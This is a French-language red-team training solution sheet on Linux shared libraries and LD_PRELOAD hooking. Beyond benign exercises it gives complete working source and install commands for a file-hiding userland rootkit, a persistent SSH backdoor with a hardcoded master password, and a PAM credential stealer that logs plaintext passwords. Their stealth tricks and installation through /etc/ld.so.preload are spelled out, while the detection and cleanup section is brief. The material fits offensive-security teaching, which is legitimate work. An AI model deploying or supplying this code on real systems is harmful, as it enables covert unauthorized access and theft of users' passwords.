# Solutions - Shared Libraries

## Exercice 1 : Découverte (Très facile)

### Objectif
Créer une bibliothèque partagée simple et l'utiliser dans un programme

### Solution

**Étape 1: Créer la bibliothèque**

```c
// mylib.c - Notre bibliothèque simple
#include <stdio.h>

// Fonction exportée par notre bibliothèque
void say_hello(const char *name) {
    printf("Hello, %s! (depuis mylib.so)\n", name);
}

// Fonction pour additionner deux nombres
int add(int a, int b) {
    return a + b;
}
```

**Étape 2: Créer le header**

```c
// mylib.h - Header de notre bibliothèque
#ifndef MYLIB_H
#define MYLIB_H

void say_hello(const char *name);
int add(int a, int b);

#endif
```

**Étape 3: Créer le programme principal**

```c
// main_ex1.c - Programme utilisant notre bibliothèque
#include <stdio.h>
#include "mylib.h"

int main(void) {
    printf("[*] Utilisation de la bibliothèque partagée\n\n");

    // Appeler les fonctions de la bibliothèque
    say_hello("Red Team");

    int result = add(42, 13);
    printf("42 + 13 = %d\n", result);

    return 0;
}
```

**Compilation:**

```bash
# 1. Compiler la bibliothèque en .so (shared object)
gcc -shared -fPIC -o libmylib.so mylib.c

# 2. Compiler le programme principal
gcc -o main_ex1 main_ex1.c -L. -lmylib

# 3. Exécuter (définir LD_LIBRARY_PATH pour trouver la .so)
LD_LIBRARY_PATH=. ./main_ex1

# Ou copier la .so dans un chemin système (nécessite root)
# sudo cp libmylib.so /usr/local/lib/
# sudo ldconfig
# ./main_ex1
```

**Vérifier les dépendances:**

```bash
# Voir les bibliothèques utilisées par le programme
ldd main_ex1
# Devrait montrer libmylib.so => ./libmylib.so
```

**Explication:**
- `-shared` : créer une bibliothèque partagée
- `-fPIC` : Position Independent Code (requis pour les .so)
- `-L.` : chercher les bibliothèques dans le répertoire courant
- `-lmylib` : linker avec libmylib.so
- `LD_LIBRARY_PATH` : chemin où chercher les .so au runtime

---

## Exercice 2 : Hook avec LD_PRELOAD (Facile)

### Objectif
Créer un hook basique de `printf()` avec LD_PRELOAD

### Solution

```c
// hook_printf_ex2.c - Hook simple de printf
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>

// Pointeur vers le vrai printf
static int (*real_printf)(const char *format, ...) = NULL;

// Notre version de printf
int printf(const char *format, ...) {
    // Charger le vrai printf la première fois
    if (!real_printf) {
        real_printf = dlsym(RTLD_NEXT, "printf");
        if (!real_printf) {
            fprintf(stderr, "Erreur dlsym: %s\n", dlerror());
            return -1;
        }
    }

    // Afficher un préfixe pour montrer qu'on a intercepté l'appel
    real_printf("[HOOK] ");

    // Appeler le vrai printf avec les arguments
    va_list args;
    va_start(args, format);
    int ret = vprintf(format, args);
    va_end(args);

    return ret;
}
```

**Programme de test:**

```c
// test_printf.c
#include <stdio.h>

int main(void) {
    printf("Message 1\n");
    printf("Message 2: %d\n", 42);
    printf("Message 3: %s\n", "Hello");
    return 0;
}
```

**Compilation et test:**

```bash
# Compiler le hook en shared library
gcc -shared -fPIC -o hook_printf.so hook_printf_ex2.c -ldl

# Compiler le programme de test
gcc -o test_printf test_printf.c

# Test SANS hook
./test_printf
# Sortie:
# Message 1
# Message 2: 42
# Message 3: Hello

# Test AVEC hook (LD_PRELOAD)
LD_PRELOAD=./hook_printf.so ./test_printf
# Sortie:
# [HOOK] Message 1
# [HOOK] Message 2: 42
# [HOOK] Message 3: Hello
```

**Explication:**
- `dlsym(RTLD_NEXT, "printf")` : obtient l'adresse du vrai printf
- `RTLD_NEXT` : cherche le prochain symbole dans la chaîne de chargement
- `va_list` : pour gérer les arguments variables (...) de printf
- LD_PRELOAD charge notre .so AVANT la libc, donc notre printf est appelé en premier

---

## Exercice 3 : Rootkit Userland (Moyen)

### Objectif
Créer un rootkit simple qui cache des fichiers en hookant `readdir()`

### Solution

```c
// rootkit_ex3.c - Rootkit userland pour cacher des fichiers
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

// Pointeur vers le vrai readdir
static struct dirent* (*real_readdir)(DIR *dirp) = NULL;

// Préfixe des fichiers à cacher
#define HIDDEN_PREFIX ".secret_"

// Notre version de readdir
struct dirent* readdir(DIR *dirp) {
    // Charger le vrai readdir
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;

    // Boucle jusqu'à trouver un fichier non-caché
    while ((entry = real_readdir(dirp)) != NULL) {
        // Si le fichier commence par HIDDEN_PREFIX, le sauter
        if (strncmp(entry->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
            continue;  // Fichier caché, passer au suivant
        }

        // Fichier normal, le retourner
        return entry;
    }

    // Plus de fichiers
    return NULL;
}

// Hook aussi readdir64 (utilisé par certains programmes)
static struct dirent64* (*real_readdir64)(DIR *dirp) = NULL;

struct dirent64* readdir64(DIR *dirp) {
    if (!real_readdir64) {
        real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *entry;

    while ((entry = real_readdir64(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
            continue;
        }
        return entry;
    }

    return NULL;
}

// Hook open pour bloquer l'accès direct
static int (*real_open)(const char *pathname, int flags, ...) = NULL;

int open(const char *pathname, int flags, ...) {
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

    // Bloquer l'accès aux fichiers cachés
    if (pathname && strstr(pathname, HIDDEN_PREFIX)) {
        // Simuler "file not found"
        errno = ENOENT;
        return -1;
    }

    // Fichier normal, appeler le vrai open
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }

    return real_open(pathname, flags);
}
```

**Tests:**

```bash
# Compiler le rootkit
gcc -shared -fPIC -o rootkit.so rootkit_ex3.c -ldl

# Créer des fichiers de test
cd /tmp
touch file1.txt
touch file2.txt
touch .secret_malware
touch .secret_backdoor

# Test SANS rootkit (ls voit tous les fichiers)
ls -la
# file1.txt
# file2.txt
# .secret_malware    ← VISIBLE
# .secret_backdoor   ← VISIBLE

# Test AVEC rootkit (ls ne voit pas les fichiers cachés)
LD_PRELOAD=./rootkit.so ls -la
# file1.txt
# file2.txt
# (les .secret_* sont invisibles!)

# Même avec cat, le fichier est "inexistant"
LD_PRELOAD=./rootkit.so cat .secret_malware
# cat: .secret_malware: No such file or directory

# MAIS le fichier existe toujours !
cat .secret_malware  # Sans LD_PRELOAD, ça marche
```

**Version améliorée avec logging:**

```c
// rootkit_ex3_logged.c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <time.h>

#define HIDDEN_PREFIX ".secret_"
#define LOG_FILE "/tmp/.rootkit.log"

static struct dirent* (*real_readdir)(DIR *dirp) = NULL;

// Logger les tentatives d'accès aux fichiers cachés
void log_access_attempt(const char *filename) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%s] Tentative d'accès bloquée: %s\n",
                ctime(&now), filename);
        fclose(log);
    }
}

struct dirent* readdir(DIR *dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
            log_access_attempt(entry->d_name);
            continue;
        }
        return entry;
    }
    return NULL;
}
```

**Explication:**
- `readdir()` est appelé par `ls`, `find`, etc. pour lister les fichiers
- En sautant (`continue`) les fichiers cachés, ils deviennent invisibles
- On hook aussi `open()` pour bloquer l'accès direct
- Le rootkit est actif uniquement pour les processus avec LD_PRELOAD

---

## Exercice 4 : Backdoor SSH (Difficile)

### Objectif
Créer une backdoor SSH persistante via LD_PRELOAD qui accepte un mot de passe master

### Solution

```c
// ssh_backdoor_ex4.c - Backdoor SSH via hooking
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <crypt.h>
#include <time.h>
#include <unistd.h>

// Mot de passe backdoor
#define BACKDOOR_PASSWORD "R3dT3am2024!"
#define LOG_FILE "/var/tmp/.ssh_access.log"

// Hook de strcmp pour bypass password check
static int (*real_strcmp)(const char *s1, const char *s2) = NULL;

int strcmp(const char *s1, const char *s2) {
    if (!real_strcmp) {
        real_strcmp = dlsym(RTLD_NEXT, "strcmp");
    }

    // Si c'est notre mot de passe backdoor, simuler un match
    if (s1 && real_strcmp(s1, BACKDOOR_PASSWORD) == 0) {
        // Logger l'accès backdoor
        FILE *log = fopen(LOG_FILE, "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] BACKDOOR ACCESS - PID: %d, UID: %d\n",
                    ctime(&now), getpid(), getuid());
            fclose(log);
        }
        return 0;  // Match!
    }

    if (s2 && real_strcmp(s2, BACKDOOR_PASSWORD) == 0) {
        FILE *log = fopen(LOG_FILE, "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] BACKDOOR ACCESS - PID: %d, UID: %d\n",
                    ctime(&now), getpid(), getuid());
            fclose(log);
        }
        return 0;
    }

    // Sinon, comportement normal
    return real_strcmp(s1, s2);
}

// Hook strncmp aussi
static int (*real_strncmp)(const char *s1, const char *s2, size_t n) = NULL;

int strncmp(const char *s1, const char *s2, size_t n) {
    if (!real_strncmp) {
        real_strncmp = dlsym(RTLD_NEXT, "strncmp");
    }

    size_t bdoor_len = strlen(BACKDOOR_PASSWORD);

    if (s1 && n >= bdoor_len &&
        real_strncmp(s1, BACKDOOR_PASSWORD, bdoor_len) == 0) {
        FILE *log = fopen(LOG_FILE, "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] BACKDOOR ACCESS (strncmp) - PID: %d\n",
                    ctime(&now), getpid());
            fclose(log);
        }
        return 0;
    }

    if (s2 && n >= bdoor_len &&
        real_strncmp(s2, BACKDOOR_PASSWORD, bdoor_len) == 0) {
        FILE *log = fopen(LOG_FILE, "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] BACKDOOR ACCESS (strncmp) - PID: %d\n",
                    ctime(&now), getpid());
            fclose(log);
        }
        return 0;
    }

    return real_strncmp(s1, s2, n);
}

// Hook getenv pour cacher LD_PRELOAD (furtivité)
static char* (*real_getenv)(const char *name) = NULL;

char* getenv(const char *name) {
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    // Cacher LD_PRELOAD dans les variables d'environnement
    if (name && strcmp(name, "LD_PRELOAD") == 0) {
        return NULL;  // Variable "inexistante"
    }

    return real_getenv(name);
}
```

**Installation persistante:**

```bash
# Compiler la backdoor
gcc -shared -fPIC -o ssh_backdoor.so ssh_backdoor_ex4.c -ldl -lcrypt

# Copier dans un emplacement système (nécessite root)
sudo cp ssh_backdoor.so /usr/lib/x86_64-linux-gnu/libnss_backdoor.so.2

# Méthode 1: /etc/ld.so.preload (global, tous les processus)
echo "/usr/lib/x86_64-linux-gnu/libnss_backdoor.so.2" | sudo tee /etc/ld.so.preload

# Méthode 2: Wrapper SSH (plus furtif)
sudo mv /usr/sbin/sshd /usr/sbin/sshd.real

# Créer le wrapper
cat << 'EOF' | sudo tee /usr/sbin/sshd
#!/bin/bash
export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libnss_backdoor.so.2
exec /usr/sbin/sshd.real "$@"
EOF

sudo chmod +x /usr/sbin/sshd

# Redémarrer SSH
sudo systemctl restart sshd
```

**Test de la backdoor:**

```bash
# Depuis une autre machine
ssh user@target
# Password: R3dT3am2024!
# → Accès accordé même si ce n'est pas le vrai mot de passe!

# Vérifier le log
cat /var/tmp/.ssh_access.log
```

**OPSEC - Détection et contre-mesures:**

```bash
# 1. Vérifier /etc/ld.so.preload
cat /etc/ld.so.preload

# 2. Vérifier les bibliothèques chargées par sshd
sudo cat /proc/$(pidof sshd)/maps | grep "\.so"

# 3. Comparer checksums des binaires
sudo md5sum /usr/sbin/sshd
sudo debsums openssh-server  # Sur Debian/Ubuntu

# 4. Chercher les .so suspectes
find /usr/lib -name "*.so*" -mtime -7  # Modifiées récemment
```

**Nettoyage (uninstall):**

```bash
# Supprimer de /etc/ld.so.preload
sudo rm /etc/ld.so.preload

# Restaurer le vrai sshd
sudo rm /usr/sbin/sshd
sudo mv /usr/sbin/sshd.real /usr/sbin/sshd

# Supprimer la backdoor
sudo rm /usr/lib/x86_64-linux-gnu/libnss_backdoor.so.2

# Redémarrer SSH
sudo systemctl restart sshd
```

**Explication:**
- On hook `strcmp()` et `strncmp()` utilisés pour comparer les mots de passe
- Quand notre backdoor password est comparé, on retourne 0 (égal) même s'il est différent
- On hook aussi `getenv()` pour cacher la présence de LD_PRELOAD
- Le nom du fichier (`libnss_backdoor.so.2`) ressemble à une lib système légitime (furtivité)

---

## Bonus : Credential Stealer Avancé

### Objectif
Voler les passwords en hookant `crypt()` utilisé par PAM

```c
// credential_stealer.c - Vol de credentials via hook crypt()
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <time.h>
#include <unistd.h>
#include <crypt.h>

#define CRED_LOG "/dev/shm/.credentials"  // Stockage en RAM (volatile)

static char* (*real_crypt)(const char *key, const char *salt) = NULL;

char* crypt(const char *key, const char *salt) {
    if (!real_crypt) {
        real_crypt = dlsym(RTLD_NEXT, "crypt");
    }

    // EXFILTRER LE PASSWORD EN CLAIR !
    if (key && strlen(key) > 0) {
        FILE *log = fopen(CRED_LOG, "a");
        if (log) {
            time_t now = time(NULL);
            char time_str[64];
            strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S",
                     localtime(&now));

            fprintf(log, "[%s] PID:%d UID:%d PASSWORD:%s\n",
                    time_str, getpid(), getuid(), key);
            fclose(log);

            // Permissions restrictives
            chmod(CRED_LOG, 0600);
        }
    }

    // Appeler le vrai crypt
    return real_crypt(key, salt);
}

// Hook aussi getpwnam (résolution username)
static struct passwd* (*real_getpwnam)(const char *name) = NULL;

struct passwd* getpwnam(const char *name) {
    if (!real_getpwnam) {
        real_getpwnam = dlsym(RTLD_NEXT, "getpwnam");
    }

    // Logger les tentatives de lookup
    if (name) {
        FILE *log = fopen(CRED_LOG, "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] USERNAME_LOOKUP: %s\n", ctime(&now), name);
            fclose(log);
        }
    }

    return real_getpwnam(name);
}
```

**Compilation et test:**

```bash
gcc -shared -fPIC -o stealer.so credential_stealer.c -ldl -lcrypt

# Méthode 1: Test avec sudo
LD_PRELOAD=./stealer.so sudo -k
sudo ls
# Taper un password

# Vérifier le log
cat /dev/shm/.credentials

# Méthode 2: Installation globale (DANGEREUX)
echo "$(pwd)/stealer.so" | sudo tee -a /etc/ld.so.preload

# Maintenant TOUS les passwords seront loggés !
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Créer une bibliothèque partagée (.so) en C
- [x] Utiliser LD_PRELOAD pour précharger une bibliothèque
- [x] Hooker des fonctions libc avec dlsym(RTLD_NEXT)
- [x] Créer un rootkit userland pour cacher des fichiers
- [x] Implémenter une backdoor SSH persistante
- [x] Comprendre les risques et la détection de LD_PRELOAD
- [x] Savoir nettoyer et désinstaller une backdoor
